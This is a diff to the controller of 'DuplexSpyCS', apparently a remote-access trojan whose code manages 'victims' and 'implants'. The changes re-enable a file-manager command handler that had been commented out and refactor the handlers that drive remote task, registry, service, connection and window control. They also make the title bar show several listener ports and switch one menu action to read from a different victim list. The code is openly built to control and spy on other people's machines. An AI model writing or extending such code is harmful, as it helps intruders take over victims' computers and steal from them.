@@ -346,11 +346,9 @@ namespace DuplexSpyCS
                 #endregion
                 #region FileMgr
 
-                /*
-
                 else if (cmd[0] == "file")
                 {
-                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                     frmFileTransferState ft = (frmFileTransferState)clsTools.GetFormByVictim(v, Function.TransferFileState);
                     if (f == null && ft == null)
                     {
@@ -629,14 +627,12 @@ namespace DuplexSpyCS
                     }
                 }
 
-                */
-
                 #endregion
                 #region TaskMgr
 
                 else if (cmd[0] == "task")
                 {
-                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -688,7 +684,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "reg") //RegEdit
                 {
-                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -826,7 +822,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "serv")
                 {
-                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -841,7 +837,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "conn")
                 {
-                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -856,7 +852,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "window")
                 {
-                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmManager f = clsTools.fnFindForm<frmManager>(v);
                     if (f == null)
                         return;
 
@@ -1627,8 +1623,10 @@ namespace DuplexSpyCS
 
         private void timer1_Tick(object sender, EventArgs e)
         {
+            string szPorts = m_dicListener.Keys.Count == 0 ? string.Empty : string.Join(", ", m_dicListener.Keys.Select(x => m_dicListener[x]).Select(x => x.m_nPort.ToString()));
+
             Text = $"DuplexSpyCS v1.0.0 by ISSAC | " +
-                $"Port[{(listener == null || listener.m_nPort == -1 ? string.Empty : listener.m_nPort)}] | " +
+                $"Port[{szPorts}] | " +
                 $"Online[{listView1.Items.Count}] - " +
                 $"Implant[{listView2.Items.Count}] - " +
                 $"Total[{(listView1.Items.Count + listView2.Items.Count)}] | " +
@@ -2165,7 +2163,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem44_Click(object sender, EventArgs e)
         {
-            List<clsVictim> ls = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            List<clsVictim> ls = listView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
 
             foreach (var victim in ls)
             {
